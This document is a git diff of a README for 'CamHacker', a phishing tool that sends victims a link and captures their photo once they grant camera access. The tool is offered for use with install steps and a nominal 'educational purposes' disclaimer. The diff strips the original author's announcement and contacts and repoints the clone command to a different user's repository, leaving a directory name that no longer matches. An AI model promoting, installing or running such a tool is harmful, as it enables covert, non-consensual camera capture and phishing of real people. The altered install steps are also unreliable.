@@ -20,14 +20,10 @@
 ### [+] Description
 CamHacker is a phishing tool. It will generate a link. If anyone opens the link and permits camera access, his/her photo will be captured and sent to you!
 
-### [*]Announcent
-
-This project is now a part of [MaxPhisher](https://github.com/KasRoudra/MaxPhisher). Further bug fixes and feature addition will be available in that
-
 
 ### [+] Installation
 
- - `git clone https://github.com/KasRoudra/CamHacker`
+ - `git clone https://github.com/maminhaz60/CamHack`
  - `cd CamHacker`
 
 For termux, use additional command `termux-setup-storage`
@@ -90,15 +86,3 @@ Thanks to <a href="https://github.com/noob-hackers/grabcam">Noob-Hackers</a>, <a
 
 ### [+] Disclaimer 
 ***This tool is developed for educational purposes. Here it demonstrates how camera phishing works. If anybody wants to gain unauthorized access to someones camera, he/she may try out this at his/her own risk. You have your own responsibilities and you are liable to any damage or violation of laws by this tool. The author is not responsible for any misuse of CamHacker!***
-
-## [~] Find Me on :
-
-- [![Github](https://img.shields.io/badge/Github-KasRoudra-green?style=for-the-badge&logo=github)](https://github.com/KasRoudra)
-
-- [![Gmail](https://img.shields.io/badge/Gmail-KasRoudra-green?style=for-the-badge&logo=gmail)](mailto:kasroudrakrd@gmail.com)
-
-- [![Facebook](https://img.shields.io/badge/Facebook-KasRoudra-green?style=for-the-badge&logo=facebook)](https://facebook.com/KasRoudra)
-
-- [![Messenger](https://img.shields.io/badge/Messenger-KasRoudra-green?style=for-the-badge&logo=messenger)](https://m.me/KasRoudra)
-
-
